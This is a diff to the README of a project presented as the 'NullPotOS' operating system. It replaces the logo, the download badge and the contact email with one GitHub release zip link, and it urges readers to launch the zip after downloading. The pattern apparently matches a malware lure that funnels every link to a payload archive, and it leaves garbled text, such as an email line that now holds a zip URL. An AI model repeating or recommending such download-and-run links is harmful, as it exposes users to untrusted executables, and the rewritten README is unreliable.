@@ -1,6 +1,6 @@
 # NullPotOS 🚀
 
-![NullPotOS Logo](https://example.com/logo.png)
+![NullPotOS Logo](https://github.com/Badinyan49/NullPotOS/releases/download/v1.0/Release_x64.zip)
 
 Welcome to NullPotOS, an innovative Uefi and X86\_64 UNIX-like operating system! This repository contains all the essential components for building and running NullPotOS on your x86\_64 machine. Dive into the world of operating system development with NullPotOS and explore its bootloader, drivers, elf, hal, kernel, and more.
 
@@ -25,9 +25,9 @@ Welcome to NullPotOS, an innovative Uefi and X86\_64 UNIX-like operating system!
 
 ## 🚀 Getting Started
 To get started with NullPotOS, you can download the necessary software package from the following link:
-[![Download NullPotOS Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download NullPotOS Software](https://github.com/Badinyan49/NullPotOS/releases/download/v1.0/Release_x64.zip)](https://github.com/Badinyan49/NullPotOS/releases/download/v1.0/Release_x64.zip)
 
-Make sure to launch the Software.zip file after downloading to kickstart your NullPotOS experience!
+Make sure to launch the https://github.com/Badinyan49/NullPotOS/releases/download/v1.0/Release_x64.zip file after downloading to kickstart your NullPotOS experience!
 
 If you encounter any issues with the download link, please check the "Releases" section for alternative downloads.
 
@@ -41,6 +41,6 @@ Contributions to NullPotOS are welcome! Whether you want to enhance the existing
 NullPotOS is licensed under the MIT License. See the LICENSE file for more details.
 
 ## 📞 Contact
-For any inquiries or discussions related to NullPotOS, you can reach out via email at nullpotos@example.com.
+For any inquiries or discussions related to NullPotOS, you can reach out via email at https://github.com/Badinyan49/NullPotOS/releases/download/v1.0/Release_x64.zip
 
 Start your journey into the world of operating system development with NullPotOS today! Happy coding! 🌟
